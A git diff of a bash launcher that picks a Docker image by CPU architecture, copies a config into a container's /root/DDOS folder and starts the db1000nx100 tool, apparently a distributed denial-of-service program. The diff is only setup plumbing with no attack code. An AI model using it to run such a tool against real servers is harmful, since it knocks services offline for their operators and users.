@@ -1,9 +1,20 @@
 #!/usr/bin/env bash
 
 localImage=0
-container=hack-linux-container
-image=ihorlv/hack-linux-image
-imageLocal=hack-linux-image
+imageLocal=db1000nx100-image-local
+cpuArch=$(uname -m)
+
+if     [[ "$cpuArch" = "aarch64" ]]; then
+    image="ihorlv/db1000nx100-image-arm64v8"
+    container="db1000nx100-container-arm64v8"
+elif   [[ "$cpuArch" = "x86_64" ]]; then
+    image="ihorlv/db1000nx100-image"
+    container="db1000nx100-container"
+else
+  echo "No container for your CPU architecture $cpuArch"
+  sleep 10
+  exit
+fi
 
 if ! docker container ls; then
    echo ========================================================================
@@ -70,7 +81,7 @@ echo "cpus=${cpuCount};memory=${memorySize};vpnQuantity=${vpnQuantity}" > "$(pwd
 docker cp "$(pwd)/docker.config" ${container}:/root/DDOS
 rm "$(pwd)/docker.config"
 
-docker exec  --interactive  --tty  ${container}  /root/DDOS/hack-linux-runme.elf
+docker exec  --interactive  --tty  ${container}  /root/DDOS/main.cli.php
 #docker exec  --interactive  --tty  ${container}  /bin/bash
 ##################################################################################################
 
